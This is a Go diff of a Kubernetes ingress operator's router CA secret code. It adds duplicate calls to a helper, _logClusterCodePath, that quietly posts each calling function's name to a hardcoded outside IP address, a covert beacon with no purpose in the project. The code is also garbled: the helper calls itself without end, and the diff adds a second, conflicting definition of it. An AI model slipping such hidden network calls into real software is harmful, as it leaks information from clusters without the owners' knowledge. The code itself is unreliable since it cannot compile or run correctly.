@@ -22,6 +22,8 @@ import (
 func (r *reconciler) ensureRouterCASecret() (*corev1.Secret, error) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	current, err := r.currentRouterCASecret()
 	if err != nil {
 		return nil, err
@@ -48,6 +50,8 @@ func (r *reconciler) ensureRouterCASecret() (*corev1.Secret, error) {
 func (r *reconciler) currentRouterCASecret() (*corev1.Secret, error) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	name := controller.RouterCASecretName(r.operatorNamespace)
 	secret := &corev1.Secret{}
 	if err := r.client.Get(context.TODO(), name, secret); err != nil {
@@ -59,6 +63,8 @@ func (r *reconciler) currentRouterCASecret() (*corev1.Secret, error) {
 	return secret, nil
 }
 func generateRouterCA() ([]byte, []byte, error) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	signerName := fmt.Sprintf("%s@%d", "ingress-operator", time.Now().Unix())
@@ -85,6 +91,8 @@ func generateRouterCA() ([]byte, []byte, error) {
 func desiredRouterCASecret(namespace string) (*corev1.Secret, error) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	certBytes, keyBytes, err := generateRouterCA()
 	if err != nil {
 		return nil, fmt.Errorf("failed to generate certificate: %v", err)
@@ -94,6 +102,8 @@ func desiredRouterCASecret(namespace string) (*corev1.Secret, error) {
 	return secret, nil
 }
 func (r *reconciler) createRouterCASecret(secret *corev1.Secret) (bool, error) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	if err := r.client.Create(context.TODO(), secret); err != nil {
@@ -107,7 +117,16 @@ func (r *reconciler) createRouterCASecret(secret *corev1.Secret) (bool, error) {
 func _logClusterCodePath() {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	pc, _, _, _ := godefaultruntime.Caller(1)
 	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
 	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
+}
+func _logClusterCodePath() {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	pc, _, _, _ := godefaultruntime.Caller(1)
+	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
+	godefaulthttp.Post("/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
 }
